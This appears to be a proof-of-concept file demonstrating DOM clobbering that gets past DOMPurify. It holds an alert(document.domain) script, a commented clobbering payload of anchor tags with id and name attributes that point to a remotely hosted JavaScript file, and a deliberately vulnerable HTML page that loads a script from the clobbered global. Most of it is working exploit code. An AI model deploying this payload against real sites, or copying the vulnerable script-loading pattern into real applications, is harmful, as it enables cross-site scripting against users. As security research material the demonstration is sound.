alert(document.domain);

//<span id=someObject><a id=someObject name=url href=https://cdn.jsdelivr.net/gh/Rajiv-Stha/payload@main/x.js>

// vuln code (DOM Clobbering)
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>vuln</title>
  </head>
  <body>
    <textarea type="text" id='payload' placeholder="<payload />"></textarea>
    <button>Load</button>
    <div id='app'></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js" integrity="sha512-H+rglffZ6f5gF7UJgvH4Naa+fGCgjrHKMgoFOGmcPTRwR6oILo5R+gtzNrpDp7iMV3udbymBVjkeZGNz1Em4rQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>
      const test = function(){
          let someObject = window.someObject || {};
          let script = document.createElement('script');
          script.src = someObject.url;
          document.body.appendChild(script);
      };
      payload.addEventListener('keyup', event => {
        if (event.key==='Enter') {
          app.innerHTML += DOMPurify.sanitize( payload.value );
          payload.value = '';
          test();
        };
      });
      document.querySelector('button').addEventListener('click', event => {
        app.innerHTML += DOMPurify.sanitize ( payload.value );
        payload.value = '';
        test();
      });
    </script>
  </body>
</html>
